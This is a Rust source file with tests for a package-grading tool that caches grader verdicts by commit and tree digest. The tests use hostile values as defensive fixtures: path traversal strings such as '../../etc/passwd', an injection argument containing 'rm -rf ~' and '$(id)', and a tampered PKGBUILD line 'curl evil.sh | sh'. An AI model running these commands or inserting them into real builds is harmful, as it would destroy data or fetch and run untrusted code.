pub fn cached_failure(package: &str, commit: &str, digest: &str, grader: &str) -> Option<String> {
    let commit = check_commit(commit).ok()?;
    read_failure(
        &failed_path(&cache_dir(package).ok()?, commit, grader),
        digest,
    )
}

fn read_failure(path: &Path, digest: &str) -> Option<String> {
    let record: Value = serde_json::from_str(&fs::read_to_string(path).ok()?).ok()?;
    let field = |key: &str| record.get(key)?.as_str();
    if field("pacrat") != Some(FAILURE_TAG) || field("tree") != Some(digest) {
        return None;
    }
    // A grader's own text about its own failure: neutered like everything
    // else it says.
    Some(truncate(&visible_line(field("reason")?).0, 120))
}

/// Print one cached grading exactly as `pacrat grade` prints a fresh one —
/// same fields, same neutering, same order. A reviewer reading `review` and
/// a reviewer reading `grade` must be reading the same report.
pub fn print_cached(c: &Cached) {
    let (name, _) = visible_line(&c.grader);
    println!("grader    {}", truncate(&name, 40));
    print_grading(&c.grader, &c.report, "cached");
    if c.standing == Standing::Retired {
        println!(
            "standing  {} is not in this host's config — its grade can make this \
             verdict worse, and can never make one exist",
            truncate(&name, 40)
        );
    }
}

/// The grade a set of cached gradings answers with: the worst on record if
/// anybody with standing answered, and `None` — ungraded, which holds — if
/// nobody did.
///
/// Returns the grade rather than the verdict so that a caller feeds it to
/// [`verdict_line`] and prints the same sentence `grade` prints. Two code
/// paths that derive a verdict separately are two code paths that can come
/// to different answers about the same package.
pub fn cached_grade(gradings: &[Cached]) -> Option<u8> {
    let contributions: Vec<Contribution> = gradings.iter().map(Cached::contribution).collect();
    // The quorum rule: only a configured grader or a human answers, and the
    // worst grade on record — retired ones included — is the answer.
    has_quorum(&contributions)
        .then(|| worst_grade(&contributions))
        .flatten()
}

// ----------------------------------------------------------------- helpers

/// A commit as a cache-path component. Hex only: the value reaches a
/// filename and a grader's argv, and every commit pacrat deals with comes
/// from `git rev-parse`.
fn check_commit(commit: &str) -> Result<&str, String> {
    if commit.len() < 7 || commit.len() > 64 || !commit.chars().all(|c| c.is_ascii_hexdigit()) {
        return Err(format!(
            "{commit:?} is not a commit hash — pacrat wants 7-64 hex characters, \
             as `git rev-parse` prints them"
        ));
    }
    Ok(commit)
}

fn now_secs() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

#[cfg(test)]
mod tests {
    use super::*;

    // ---- pure helpers ----

    /// The CLI half of the ledger check. `Sources::from_toml` rejects these
    /// too — see `sources::tests::a_reviewed_commit_that_is_not_a_commit_
    /// fails_to_parse`, which uses the same hostile values. Both layers,
    /// because a `Sources` can be built in memory without passing through
    /// the parser, and this value becomes a path component of the cache.
    #[test]
    fn commits_must_look_like_commits() {
        assert!(check_commit("3f9c21ab").is_ok());
        assert!(check_commit(&"a".repeat(40)).is_ok());
        for bad in [
            "",
            "abc", // too short to name one tree
            // The traversal a reviewer demonstrated escaping the state dir
            // with, as `reviewed` in a synced ledger.
            "../../../../PWNED",
            "../../etc/passwd",
            "3f9c21ab/../x",
            "HEAD~1",
            "3f9c21ab.manual", // would collide with a cache filename
            &"a".repeat(65),
        ] {
            assert!(check_commit(bad).is_err(), "{bad:?} should be rejected");
        }
    }

    /// What a rejected commit would have cost. A cache filename is supposed
    /// to be one component inside the package's directory; a traversal makes
    /// it something else entirely, which is why `check_commit` guards every
    /// path into here.
    #[test]
    fn a_rejected_commit_would_have_escaped_the_cache_directory() {
        let dir = Path::new("/state/grades/mdcat");

        let escaped = ok_path(dir, "../../../../PWNED", MANUAL);
        assert_ne!(
            escaped.parent(),
            Some(dir),
            "the traversal should not have stayed inside the cache directory"
        );
        assert!(escaped
            .components()
            .any(|c| c == std::path::Component::ParentDir));

        // A real object id stays put — one file, one directory.
        assert_eq!(ok_path(dir, &"a".repeat(40), MANUAL).parent(), Some(dir));
    }

    #[test]
    fn cache_filenames_separate_gradings_from_failures() {
        let dir = Path::new("/state/grades/mdcat");
        assert_eq!(
            ok_path(dir, "3f9c21ab", "yay-friend"),
            Path::new("/state/grades/mdcat/3f9c21ab.yay-friend.json")
        );
        assert_eq!(
            failed_path(dir, "3f9c21ab", "yay-friend"),
            Path::new("/state/grades/mdcat/3f9c21ab.yay-friend.failed.json")
        );
    }

    #[test]
    fn a_graders_stderr_cannot_paint_the_terminal() {
        let tail = stderr_tail(b"\x1b[8mhidden\x1b[0m\nsecond line\n");
        assert!(!tail.contains('\x1b'), "escape survived: {tail}");
        assert!(tail.contains("hidden"));
        assert!(!tail.contains("second line"), "only the first line: {tail}");
        assert_eq!(stderr_tail(b""), "");
        assert_eq!(stderr_tail(b"\n\n"), "");
    }

    // ---- the runner, actually running things ----

    struct Fixture {
        dir: PathBuf,
    }

    impl Drop for Fixture {
        fn drop(&mut self) {
            let _ = fs::remove_dir_all(&self.dir);
        }
    }

    impl Fixture {
        fn new(tag: &str) -> Self {
            let dir = std::env::temp_dir().join(format!(
                "pacrat-grade-{}-{tag}-{}",
                std::process::id(),
                now_secs()
            ));
            let _ = fs::remove_dir_all(&dir);
            fs::create_dir_all(&dir).unwrap();
            Self { dir }
        }

        /// A stub grader, as the argv that runs it.
        ///
        /// `/bin/sh <script>` rather than an executable script, deliberately:
        /// these tests run as threads of one process, so another test's
        /// fork can be holding a write descriptor on a file this one just
        /// created, and exec'ing it then fails with ETXTBSY. Nothing pacrat
        /// writes is ever exec'd here — sh only *reads* the file, which no
        /// concurrent writer can spoil. Exec'ing a grader program directly
        /// is covered end to end by the functional transcript.
        fn grader_argv(&self, name: &str, body: &str) -> Vec<String> {
            let path = self.dir.join(name);
            fs::write(&path, body).unwrap();
            vec!["/bin/sh".to_string(), path.to_string_lossy().into_owned()]
        }
    }

    #[test]
    fn a_grader_that_answers_is_captured_whole() {
        let f = Fixture::new("ok");
        // 200 KB of findings: more than a pipe buffer, so this fails if the
        // runner waits before it reads.
        let big = f.grader_argv(
            "big",
            "printf '{\"contract\":\"pacrat-grade/v1\",\"grader\":\"big\",\
             \"subject\":{\"package\":\"m\",\"commit\":\"3f9c21ab\"},\"grade\":0,\"meta\":{\"pad\":\"'\n\
             for i in $(seq 1 4000); do printf '0123456789012345678901234567890123456789012345678901234567890123456789'; done\n\
             printf '\"}}'\n",
        );
        let ran = run_with_timeout(&big, Duration::from_secs(30)).unwrap();
        assert_eq!(ran.code, Some(0));
        assert!(ran.stdout.len() > 200_000, "got {} bytes", ran.stdout.len());
        assert!(!ran.timed_out);
        let report = GradeReport::from_json(&String::from_utf8_lossy(&ran.stdout)).unwrap();
        assert_eq!(report.grade, 0);
    }

    /// The grader sleeps, and leaves a child sleeping too. `kill` reaches
    /// only the grader, so the pipe stays open — the case that would hang a
    /// runner that waited on its readers instead of bounding them.
    #[test]
    fn a_grader_that_never_returns_is_killed_at_the_timeout() {
        let f = Fixture::new("slow");
        let slow = f.grader_argv("slow", "sleep 60 &\nsleep 60\n");
        let started = Instant::now();
        let ran = run_with_timeout(&slow, Duration::from_millis(300)).unwrap();
        assert!(ran.timed_out, "should have timed out");
        // Generous, but far under the 60s the grader wanted: the point is
        // that the wait is bounded by pacrat and not by the grader.
        assert!(
            started.elapsed() < Duration::from_secs(5),
            "the runner waited {:?} on a 300ms timeout",
            started.elapsed()
        );
    }

    #[test]
    fn a_missing_program_is_a_spawn_error_not_a_panic() {
        let e = run_with_timeout(
            &["/nonexistent/pacrat-test-grader".to_string()],
            Duration::from_secs(5),
        )
        .unwrap_err();
        assert!(e.contains("could not run"), "unhelpful error: {e}");
    }

    #[test]
    fn exit_codes_and_stderr_come_back() {
        let f = Fixture::new("angry");
        let angry = f.grader_argv("angry", "echo 'no api key' >&2\nexit 3\n");
        let ran = run_with_timeout(&angry, Duration::from_secs(5)).unwrap();
        assert_eq!(ran.code, Some(3));
        assert!(stderr_tail(&ran.stderr).contains("no api key"));
    }

    /// Each argv element arrives as one argument, whatever it contains.
    /// The stub here is a shell — the most eager interpreter available —
    /// and even it receives the metacharacters as inert text, because they
    /// were never on a command line for it to parse.
    #[test]
    fn arguments_reach_the_program_verbatim() {
        let f = Fixture::new("echoargs");
        let hostile = "a; rm -rf ~ #'\"$(id)`id`";
        let mut argv = f.grader_argv("echoargs", "for a in \"$@\"; do echo \"[$a]\"; done\n");
        argv.push(hostile.to_string());
        argv.push("second arg".to_string());
        let ran = run_with_timeout(&argv, Duration::from_secs(5)).unwrap();
        let out = String::from_utf8_lossy(&ran.stdout);
        assert_eq!(
            out,
            format!("[{hostile}]\n[second arg]\n"),
            "the shell metacharacters were interpreted somewhere"
        );
    }

    // ---- the cache ----

    const FULL: &str = "3f9c21ab55de0011223344556677889900aabbcc";

    fn report_json(package: &str, commit: &str, grade: u8) -> String {
        format!(
            r#"{{"contract":"pacrat-grade/v1","grader":"stub",
                 "subject":{{"package":"{package}","commit":"{commit}"}},"grade":{grade}}}"#
        )
    }

    fn grader(name: &str, cmd: Vec<String>) -> Grader {
        Grader {
            name: name.into(),
            cmd,
            timeout_s: 30,
            scale: None,
        }
    }

    /// A store tree the fixture can edit under a grading's feet.
    impl Fixture {
        fn tree(&self, contents: &str) -> (PathBuf, String) {
            let tree = self.dir.join("tree");
            fs::create_dir_all(&tree).unwrap();
            fs::write(tree.join("PKGBUILD"), contents).unwrap();
            let digest = fstree::digest(&tree).unwrap();
            (tree, digest)
        }

        fn subj<'a>(&self, digest: &'a str, tree: &'a str) -> Subj<'a> {
            Subj {
                package: "mdcat",
                commit: FULL,
                tree,
                digest,
                refresh: false,
            }
        }
    }

    fn hit(look: CacheLook) -> GradeReport {
        match look {
            CacheLook::Hit(r) => r,
            CacheLook::Miss => panic!("expected a hit, got a miss"),
            CacheLook::Stale => panic!("expected a hit, got stale"),
            CacheLook::Unusable(e) => panic!("expected a hit, got unusable: {e}"),
        }
    }

    #[test]
    fn the_cache_re_validates_what_it_reads() {
        let f = Fixture::new("cache");
        let path = ok_path(&f.dir, FULL, "stub");
        let tree = "d".repeat(64);

        assert!(matches!(
            read_cache(&path, "mdcat", FULL, &tree),
            CacheLook::Miss
        ));

        write_grading(&path, &tree, &report_json("mdcat", FULL, 2)).unwrap();
        assert_eq!(hit(read_cache(&path, "mdcat", FULL, &tree)).grade, 2);

        // Same file, different subject: not a hit, and not silently ignored.
        assert!(matches!(
            read_cache(&path, "pacseek", FULL, &tree),
            CacheLook::Unusable(_)
        ));
        assert!(matches!(
            read_cache(&path, "mdcat", "deadbeefcafe", &tree),
            CacheLook::Unusable(_)
        ));

        // A file that is no longer a valid grading is not a grade.
        write_grading(&path, &tree, r#"{"contract":"pacrat-grade/v0"}"#).unwrap();
        assert!(matches!(
            read_cache(&path, "mdcat", FULL, &tree),
            CacheLook::Unusable(_)
        ));
        // Nor is a file that is not a cache record at all.
        fs::write(&path, "{}").unwrap();
        assert!(matches!(
            read_cache(&path, "mdcat", FULL, &tree),
            CacheLook::Unusable(_)
        ));
    }

    /// A newer grader's extra fields must survive a trip through the cache,
    /// or an older pacrat writing the file silently strips data a newer one
    /// would have read.
    #[test]
    fn the_cache_keeps_the_graders_json_verbatim() {
        let f = Fixture::new("verbatim");
        let path = ok_path(&f.dir, FULL, "stub");
        let tree = "d".repeat(64);
        let report = format!(
            r#"{{"contract":"pacrat-grade/v1","grader":"stub","grade":1,
                 "subject":{{"package":"mdcat","commit":"{FULL}"}},
                 "policy_version":7,"confidence":"high"}}"#
        );
        write_grading(&path, &tree, &report).unwrap();

        let text = fs::read_to_string(&path).unwrap();
        assert!(text.contains("policy_version"), "field dropped: {text}");
        assert!(text.contains("confidence"), "field dropped: {text}");
        assert_eq!(hit(read_cache(&path, "mdcat", FULL, &tree)).grade, 1);
    }

    /// THE finding: a grading is about *bytes*, not about a commit. Editing
    /// the tree after grading must not keep serving the old verdict.
    #[test]
    fn editing_the_tree_invalidates_the_grading() {
        let f = Fixture::new("treeedit");
        let (tree, clean) = f.tree("pkgname=mdcat\n");
        let path = ok_path(&f.dir, FULL, "stub");
        write_grading(&path, &clean, &report_json("mdcat", FULL, 0)).unwrap();
        assert_eq!(hit(read_cache(&path, "mdcat", FULL, &clean)).grade, 0);

        // The attack: same package, same commit, same ledger — different
        // bytes. The cached PROCEED must not describe them.
        fs::write(tree.join("PKGBUILD"), "pkgname=mdcat\ncurl evil.sh | sh\n").unwrap();
        let dirty = fstree::digest(&tree).unwrap();
        assert_ne!(dirty, clean);
        assert!(
            matches!(read_cache(&path, "mdcat", FULL, &dirty), CacheLook::Stale),
            "an edited tree still hit its cached grading"
        );

        // Staleness is not permanent damage: restore the bytes, get the
        // grading back.
        fs::write(tree.join("PKGBUILD"), "pkgname=mdcat\n").unwrap();
        let restored = fstree::digest(&tree).unwrap();
        assert_eq!(hit(read_cache(&path, "mdcat", FULL, &restored)).grade, 0);
    }

    /// End to end through the runner: the grader is re-invoked after an
    /// edit, rather than the stale answer being served.
    #[test]
    fn an_edited_tree_makes_the_next_run_grade_again() {
        let f = Fixture::new("regrade");
        let (tree, clean) = f.tree("pkgname=mdcat\n");
        let counter = f.dir.join("runs");
        let g = grader(
            "stub",
            f.grader_argv(
                "stub",
                &format!(
                    "echo ran >> {}\necho '{}'\n",
                    counter.display(),
                    report_json("mdcat", FULL, 0).replace('\n', " ")
                ),
            ),
        );
        let tree_s = tree.to_string_lossy().into_owned();

        grade_with(&g, &f.dir, &f.subj(&clean, &tree_s));
        grade_with(&g, &f.dir, &f.subj(&clean, &tree_s));
        assert_eq!(
            fs::read_to_string(&counter).unwrap(),
            "ran\n",
            "the second run should have been a cache hit"
        );

        fs::write(tree.join("PKGBUILD"), "pkgname=mdcat\ncurl evil.sh | sh\n").unwrap();
        let dirty = fstree::digest(&tree).unwrap();
        grade_with(&g, &f.dir, &f.subj(&dirty, &tree_s));
        assert_eq!(
            fs::read_to_string(&counter).unwrap(),
            "ran\nran\n",
            "an edited tree must be graded again, not served from cache"
        );
    }

    /// `--refresh` asks again even on a hit, and still records the answer.
    #[test]
    fn refresh_skips_the_read_but_not_the_write() {
        let f = Fixture::new("refresh");
        let (tree, digest) = f.tree("pkgname=mdcat\n");
        let counter = f.dir.join("runs");
        let g = grader(
            "stub",
            f.grader_argv(
                "stub",
                &format!(
                    "echo ran >> {}\necho '{}'\n",
                    counter.display(),
                    report_json("mdcat", FULL, 0).replace('\n', " ")
                ),
            ),
        );
        let tree_s = tree.to_string_lossy().into_owned();

        grade_with(&g, &f.dir, &f.subj(&digest, &tree_s));
        let mut refreshed = f.subj(&digest, &tree_s);
        refreshed.refresh = true;
        let out = grade_with(&g, &f.dir, &refreshed);

        assert!(matches!(out, Outcome::Graded { took: Some(_), .. }));
        assert_eq!(fs::read_to_string(&counter).unwrap(), "ran\nran\n");
        // And the fresh answer is on disk for the next non-refresh run.
        assert!(matches!(
            read_cache(&ok_path(&f.dir, FULL, "stub"), "mdcat", FULL, &digest),
            CacheLook::Hit(_)
        ));
    }

    /// A grader whose declared scale drifts away from the pin is not one
    /// whose numbers can still be compared.
    #[test]
    fn a_pinned_scale_that_moves_is_ungraded() {
        let f = Fixture::new("scalepin");
        let (tree, digest) = f.tree("pkgname=mdcat\n");
        let mut g = grader(
            "stub",
            f.grader_argv(
                "stub",
                &format!(
                    "echo '{{\"contract\":\"pacrat-grade/v1\",\"grader\":\"stub\",\
                     \"subject\":{{\"package\":\"mdcat\",\"commit\":\"{FULL}\"}},\
                     \"grade\":70,\"scale\":{{\"min\":0,\"max\":100}}}}'\n"
                ),
            ),
        );
        let tree_s = tree.to_string_lossy().into_owned();

        // Unpinned, pacrat rescales and carries on: 70 of 100 is a WARN.
        let out = grade_with(&g, &f.dir, &f.subj(&digest, &tree_s));
        match out {
            Outcome::Graded { report, .. } => assert_eq!(report.pacrat_grade(), 3),
            Outcome::Failed { reason, .. } => panic!("unexpected failure: {reason}"),
        }

        // Pinned to 0-4, the same output is no answer at all.
        g.scale = Some(pacrat_core::grading::Scale { min: 0, max: 4 });
        let mut fresh = f.subj(&digest, &tree_s);
        fresh.refresh = true;
        let Outcome::Failed { reason, .. } = grade_with(&g, &f.dir, &fresh) else {
            panic!("a scale that moved should not have produced a grading");
        };
        assert!(
            reason.contains("declared scale 0-100"),
            "unhelpful: {reason}"
        );
        assert!(reason.contains("pinned 0-4"), "unhelpful: {reason}");
    }

    /// A grader that never stops writing must not become pacrat's memory
    /// footprint. The stub writes far past the cap and is cut off.
    #[test]
    fn a_flood_of_output_is_bounded_and_ungraded() {
        let f = Fixture::new("flood");
        let (tree, digest) = f.tree("pkgname=mdcat\n");
        // `yes` writes until the pipe closes; the reader's cap is what
        // closes it. Without the cap this test does not terminate.
        let g = grader(
            "flood",
            f.grader_argv("flood", "exec yes 0123456789abcdef\n"),
        );
        let tree_s = tree.to_string_lossy().into_owned();

        let Outcome::Failed { reason, .. } = grade_with(&g, &f.dir, &f.subj(&digest, &tree_s))
        else {
            panic!("an unbounded grader should not have produced a grading");
        };
        assert!(reason.contains("exceeded"), "unhelpful: {reason}");
    }

    #[test]
    fn output_at_the_limit_is_still_read() {
        // A grading right up against the cap is honest output, not a flood.
        let f = Fixture::new("atlimit");
        let pad = "p".repeat(100_000);
        let report = format!(
            r#"{{"contract":"pacrat-grade/v1","grader":"big","grade":0,
                 "subject":{{"package":"mdcat","commit":"{FULL}"}},
                 "meta":{{"pad":"{pad}"}}}}"#
        )
        .replace('\n', " ");
        let argv = f.grader_argv("big", &format!("cat <<'J'\n{report}\nJ\n"));
        let ran = run_with_timeout(&argv, Duration::from_secs(30)).unwrap();
        assert!(ran.stdout.len() > 100_000);
        assert!(ran.stdout.len() <= STDOUT_LIMIT);
        assert_eq!(
            GradeReport::from_json(&String::from_utf8_lossy(&ran.stdout))
                .unwrap()
                .grade,
            0
        );
    }

    #[test]
    fn a_failure_record_can_never_be_read_as_a_grading() {
        let f = Fixture::new("failrec");
        let path = failed_path(&f.dir, FULL, "stub");
        let tree = "d".repeat(64);
        record_failure(&path, "stub", FULL, &tree, "timed out after 2s").unwrap();
        let text = fs::read_to_string(&path).unwrap();
        assert!(text.contains(FAILURE_TAG));
        assert!(text.contains("timed out after 2s"));
        assert!(text.contains(&tree), "the failure should say which bytes");
        assert!(
            GradeReport::from_json(&text).is_err(),
            "a failure record parsed as a grading: {text}"
        );
        assert!(
            matches!(
                read_cache(&path, "mdcat", FULL, &tree),
                CacheLook::Unusable(_)
            ),
            "a failure record was read as a cache hit"
        );
    }

    #[test]
    fn unconfigured_gradings_are_found_but_failures_and_strangers_are_not() {
        let f = Fixture::new("others");
        let tree = "d".repeat(64);
        let write = |name: &str, commit: &str, grade: u8| {
            write_grading(
                &ok_path(&f.dir, commit, name),
                &tree,
                &report_json("mdcat", commit, grade),
            )
            .unwrap();
        };
        write(MANUAL, FULL, 1);
        write("retired", FULL, 3);
        write("configured", FULL, 0);
        write("manual", "deadbeefcafe", 4); // another commit entirely
        record_failure(
            &failed_path(&f.dir, FULL, "flaky"),
            "flaky",
            FULL,
            &tree,
            "x",
        )
        .unwrap();
        fs::write(ok_path(&f.dir, FULL, "corrupt"), "{").unwrap();
        // A grading of a tree that has since changed is not evidence either.
        write_grading(
            &ok_path(&f.dir, FULL, "stale"),
            &"e".repeat(64),
            &report_json("mdcat", FULL, 4),
        )
        .unwrap();

        let configured = vec![grader("configured", vec!["x".into()])];
        let found = other_cached(&f.dir, FULL, &tree, &configured, "mdcat");
        let names: Vec<&str> = found.iter().map(|(n, _)| n.as_str()).collect();
        assert_eq!(names, [MANUAL, "retired"], "found {names:?}");
        assert_eq!(found[0].1.grade, 1);

        // A directory that does not exist is an empty scan, not a failure.
        assert!(other_cached(Path::new("/nonexistent"), FULL, &tree, &[], "mdcat").is_empty());
    }

    /// The end of the loop: run, cache, hit. The grader here abbreviates the
    /// commit in its report — allowed — so this also pins that the cache is
    /// keyed by pacrat's hash and not the grader's spelling of it. Keyed the
    /// other way the file would be written where no read looks for it, and
    /// an expensive grader would be paid for on every single run.
    #[test]
    fn a_grading_is_cached_and_the_second_run_does_not_invoke() {
        let f = Fixture::new("cachehit");
        let (tree, digest) = f.tree("pkgname=mdcat\n");
        let counter = f.dir.join("runs");
        let g = grader(
            "abbrev",
            f.grader_argv(
                "abbrev",
                &format!(
                    "echo ran >> {}\n\
                     echo '{{\"contract\":\"pacrat-grade/v1\",\"grader\":\"abbrev\",\
                     \"subject\":{{\"package\":\"mdcat\",\"commit\":\"3f9c21ab\"}},\"grade\":2}}'\n",
                    counter.display()
                ),
            ),
        );
        let tree_s = tree.to_string_lossy().into_owned();

        let first = grade_with(&g, &f.dir, &f.subj(&digest, &tree_s));
        assert!(
            matches!(first, Outcome::Graded { took: Some(_), .. }),
            "the first run should have invoked the grader"
        );
        match grade_with(&g, &f.dir, &f.subj(&digest, &tree_s)) {
            Outcome::Graded { report, took } => {
                assert_eq!(took, None, "the second run should have been cached");
                assert_eq!(report.grade, 2);
            }
            Outcome::Failed { reason, .. } => panic!("second run failed: {reason}"),
        }

        // The only proof that matters: the program ran once, not twice.
        assert_eq!(fs::read_to_string(&counter).unwrap(), "ran\n");
        assert!(ok_path(&f.dir, FULL, "abbrev").exists());
    }

    /// A grader that fails leaves a breadcrumb and no grading — and is asked
    /// again next time, because a failure is not an answer to cache.
    #[test]
    fn a_failure_is_recorded_but_never_cached_as_a_grading() {
        let f = Fixture::new("failtwice");
        let (tree, digest) = f.tree("pkgname=mdcat\n");
        let counter = f.dir.join("runs");
        let g = grader(
            "broken",
            f.grader_argv(
                "broken",
                &format!("echo ran >> {}\necho 'not json'\n", counter.display()),
            ),
        );
        let tree_s = tree.to_string_lossy().into_owned();

        for _ in 0..2 {
            let outcome = grade_with(&g, &f.dir, &f.subj(&digest, &tree_s));
            let Outcome::Failed { reason, .. } = outcome else {
                panic!("garbage on stdout must not produce a grading");
            };
            report_outcome(
                &f.dir,
                FULL,
                &digest,
                "broken",
                &Outcome::Failed {
                    reason,
                    elapsed: Duration::ZERO,
                },
            );
        }
        assert_eq!(
            fs::read_to_string(&counter).unwrap(),
            "ran\nran\n",
            "a failed grader must be asked again, not written off"
        );
        assert!(failed_path(&f.dir, FULL, "broken").exists());
        assert!(
            !ok_path(&f.dir, FULL, "broken").exists(),
            "a failure was cached as a grading"
        );
    }

    // ---- reading it back (what `review` and `adopt-update` gate on) ----

    fn cached_of(standing: Standing, grade: u8) -> Cached {
        Cached {
            grader: "x".into(),
            standing,
            report: GradeReport::from_json(&report_json("mdcat", FULL, grade)).unwrap(),
        }
    }

    #[test]
    fn standing_follows_this_hosts_config_not_the_file() {
        let configured = vec![grader("yay-friend", vec!["x".into()])];
        assert_eq!(standing_of(MANUAL, &configured), Standing::Manual);
        assert_eq!(standing_of("yay-friend", &configured), Standing::Configured);
        assert_eq!(standing_of("yay-friend", &[]), Standing::Retired);
        assert_eq!(standing_of("gone", &configured), Standing::Retired);
    }

    /// The quorum rule, as the deciding verbs see it: a grading nobody on
    /// this host would run cannot make a verdict exist, and can still make
    /// one worse. Same rule as `summarize`, reached by a different door,
    /// which is exactly why it is pinned here too.
    #[test]
    fn cached_gradings_answer_only_when_somebody_with_standing_did() {
        assert_eq!(cached_grade(&[]), None);
        assert_eq!(cached_grade(&[cached_of(Standing::Retired, 4)]), None);
        assert_eq!(cached_grade(&[cached_of(Standing::Manual, 2)]), Some(2));
        assert_eq!(cached_grade(&[cached_of(Standing::Configured, 0)]), Some(0));
        // Worst wins across every standing once anyone has answered.
        assert_eq!(
            cached_grade(&[
                cached_of(Standing::Manual, 0),
                cached_of(Standing::Retired, 3)
            ]),
            Some(3)
        );
        // And the verdict that comes of it is this host's reading.
        let t = Thresholds::default();
        assert_eq!(
            t.verdict(cached_grade(&[cached_of(Standing::Retired, 4)])),
            Verdict::Ungraded
        );
        assert_eq!(
            t.verdict(cached_grade(&[cached_of(Standing::Configured, 4)])),
            Verdict::Block
        );
    }

    /// A failure record is only about the bytes it names. Reading one
    /// against a different tree would explain a candidate's silence with
    /// another candidate's excuse.
    #[test]
    fn a_recorded_failure_is_read_back_only_for_the_bytes_it_is_about() {
        let f = Fixture::new("failread");
        let tree = "d".repeat(64);
        record_failure(
            &failed_path(&f.dir, FULL, "stub"),
            "stub",
            FULL,
            &tree,
            "timed out after 300s\x1b[2K",
        )
        .unwrap();

        let path = failed_path(&f.dir, FULL, "stub");
        let reason = read_failure(&path, &tree).unwrap();
        assert!(reason.contains("timed out after 300s"));
        // The grader wrote that reason; it does not get to paint with it.
        assert!(!reason.contains('\x1b'), "{reason}");

        // Another tree's failure explains nothing about these bytes.
        assert_eq!(read_failure(&path, &"e".repeat(64)), None);
        // Nor does a grading, or a file that is not there.
        write_grading(
            &ok_path(&f.dir, FULL, "stub"),
            &tree,
            &report_json("mdcat", FULL, 0),
        )
        .unwrap();
        assert_eq!(read_failure(&ok_path(&f.dir, FULL, "stub"), &tree), None);
        assert_eq!(read_failure(Path::new("/nonexistent"), &tree), None);
    }

    /// An interrupted write must not leave a half-written grading behind:
    /// the temp file is the one that can be partial, never the real path.
    #[test]
    fn cache_writes_leave_no_partial_file() {
        let f = Fixture::new("atomic");
        let path = ok_path(&f.dir, FULL, "stub");
        let tree = "d".repeat(64);
        write_grading(&path, &tree, &report_json("mdcat", FULL, 1)).unwrap();
        let leftovers: Vec<String> = fs::read_dir(&f.dir)
            .unwrap()
            .filter_map(|e| e.ok())
            .filter_map(|e| e.file_name().into_string().ok())
            .filter(|n| n.starts_with('.') || n.ends_with(".new"))
            .collect();
        assert!(
            leftovers.is_empty(),
            "temp files left behind: {leftovers:?}"
        );
        assert_eq!(hit(read_cache(&path, "mdcat", FULL, &tree)).grade, 1);
    }
}
